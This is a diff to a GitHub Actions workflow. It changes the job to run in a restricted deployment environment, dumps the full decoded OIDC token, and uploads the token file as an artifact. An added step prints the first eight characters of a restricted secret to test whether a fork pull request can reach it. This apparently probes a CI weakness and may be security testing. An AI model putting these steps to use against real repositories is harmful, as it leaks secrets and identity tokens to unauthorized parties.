@@ -9,7 +9,7 @@ permissions:
 jobs:
   capture-oidc:
     runs-on: ubuntu-latest
-    environment: production
+    environment: restricted-deploy
     steps:
       - name: Capture OIDC token sub claim
         run: |
@@ -23,10 +23,15 @@ jobs:
           d = sys.stdin.read().strip()
           p = d + chr(61) * (4 - len(d) % 4)
           j = json.loads(base64.urlsafe_b64decode(p))
-          print(json.dumps({k:j[k] for k in [\"actor\",\"event_name\",\"ref\",\"sub\",\"workflow\",\"head_ref\"] if k in j}, indent=2))"
+          print(json.dumps(j, indent=2))"
+      - name: Check restricted secret access
+        run: |
+          echo "Restricted secret first 8 chars: ${RESTRICTED_SECRET:0:8}..."
+          if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET ACCESSIBLE VIA FORK PR!"; else echo "SECRET BLOCKED"; fi
+        env:
+          RESTRICTED_SECRET: ${{ secrets.RESTRICTED_SECRET }}
       - uses: actions/upload-artifact@v4
         with:
-          name: workflow-run-oidc-token
+          name: workflow-run-restricted-env-oidc
           path: /tmp/oidc_token.txt
           retention-days: 1
-
